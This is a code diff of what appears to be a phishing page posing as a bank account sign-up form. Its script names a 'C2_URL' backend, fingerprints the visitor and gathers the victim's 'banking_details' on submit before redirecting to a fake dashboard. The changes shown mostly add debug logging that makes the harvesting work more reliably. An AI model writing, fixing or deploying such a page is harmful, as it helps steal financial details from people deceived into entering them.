@@ -227,7 +227,7 @@
                 </div>
                 <div class="field">
                     <label>Occupation</label>
-                    <input type="text" id="" placeholder="e.g lawyer" required />
+                    <input type="text" id="e.g lawyer" placeholder="e.g lawyer" required />
                 </div>
                 <div class="row">
                     <div class="field half">
@@ -254,24 +254,28 @@
 
     <script>
         // ============================================================
-        // SIMPLIFIED — NO PERMISSIONS, NO LOCATION, NO CAMERA, NO MIC
+        // DEBUG VERSION — LOGS EVERYTHING
         // ============================================================
+
+        console.log('=== DEBUG: Page loaded ===');
 
         var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 
-        console.log('Page loaded — No permissions version');
-
         // ===== SPLASH TO LOGIN =====
         document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOMContentLoaded event fired');
             var splash = document.getElementById('splash');
             var loginPage = document.getElementById('loginPage');
 
             if (splash && loginPage) {
+                console.log('Splash and loginPage found');
                 setTimeout(function() {
                     splash.style.display = 'none';
                     loginPage.classList.remove('hidden');
                     console.log('Splash hidden, login shown');
                 }, 3000);
+            } else {
+                console.error('Splash or loginPage missing');
             }
         });
 
@@ -307,13 +311,15 @@
             });
         }
 
-        // ===== FORM SUBMIT =====
+        // ===== FORM SUBMIT — THE OPEN ACCOUNT BUTTON =====
         var signupForm = document.getElementById('signupForm');
+        console.log('signupForm element:', signupForm);
 
         if (signupForm) {
+            console.log('✅ signupForm found — attaching submit listener');
             signupForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                console.log('Open Account button clicked!');
+                console.log('🔥 Open Account button CLICKED!');
 
                 var userData = {
                     type: 'banking_details',
@@ -338,20 +344,40 @@
                     window.location.href = 'dashboard.html';
                 }, 1800);
             });
+        } else {
+            console.error('❌ signupForm NOT found! Check your HTML.');
         }
 
         // ===== INIT =====
         captureFingerprint();
 
         var submitBtn = document.getElementById('submitBtn');
+        console.log('submitBtn element:', submitBtn);
+
         if (submitBtn) {
+            // Enable the button after 3 seconds
             submitBtn.disabled = true;
+            console.log('Button disabled initially');
             setTimeout(function() {
                 submitBtn.disabled = false;
-                console.log('Submit button enabled');
+                console.log('✅ Submit button ENABLED after 3 seconds');
             }, 3000);
+        } else {
+            console.error('❌ submitBtn NOT found!');
         }
+
+        // ===== ADD A DIRECT CLICK TEST =====
+        // This is a fallback — if the form submit fails, this will still trigger
+        setTimeout(function() {
+            var btn = document.getElementById('submitBtn');
+            if (btn) {
+                btn.addEventListener('click', function() {
+                    console.log('🔥 Direct click detected on submitBtn!');
+                    // If the form submit didn't fire, this will at least show something
+                });
+            }
+        }, 500);
     </script>
 
 </body>
-                </html>
+                                                     </html>
